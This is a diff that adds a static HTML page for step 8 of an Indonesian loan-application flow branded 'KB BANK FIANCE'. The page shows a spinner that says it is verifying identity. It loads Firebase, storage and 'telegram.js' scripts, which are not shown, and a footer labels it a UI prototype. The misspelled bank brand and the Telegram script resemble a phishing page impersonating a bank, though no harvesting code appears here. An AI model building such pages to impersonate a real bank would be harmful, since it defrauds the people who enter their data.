@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>KB BANK FIANCE — Proses Pengajuan</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="flow.css">
+</head>
+<body class="flow-page">
+  <main class="flow-shell">
+    <section class="flow-hero">
+      <div class="flow-top">
+        <button class="flow-back" id="backButton" type="button">←</button>
+        <button class="flow-lang" type="button">ID 🇮🇩</button>
+      </div>
+      <div class="flow-copy">
+        <div class="flow-step">Tahap 8</div>
+        <h1>Proses Pengajuan</h1>
+        <p>Sistem sedang memvalidasi dan memproses data pengajuan.</p>
+      </div>
+    </section>
+    
+<section class="flow-card">
+  <div class="process-wrap">
+    <div class="spinner" aria-label="Memproses pengajuan"></div>
+    <div class="process-status" id="processStatus">Memverifikasi identitas...</div>
+    <p style="color:var(--muted);font-size:11px;line-height:1.6">Mohon tetap berada di halaman ini sampai proses selesai.</p>
+    <div class="process-progress"><i id="progressBar"></i></div>
+  </div>
+</section>
+  </main>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<script src="storage.js"></script>
+  <script src="telegram.js"></script>
+  <script src="proses-pengajuan.js"></script>
+<div style="padding:10px 16px;text-align:center;font-size:10px;line-height:1.5;color:#7c6f89;background:#f7f1fd;border-top:1px solid #eadcf8"><strong>UI Prototype</strong> — Alur, status, dan hasil pada halaman ini merupakan simulasi antarmuka.</div>
+</body>
+</html>
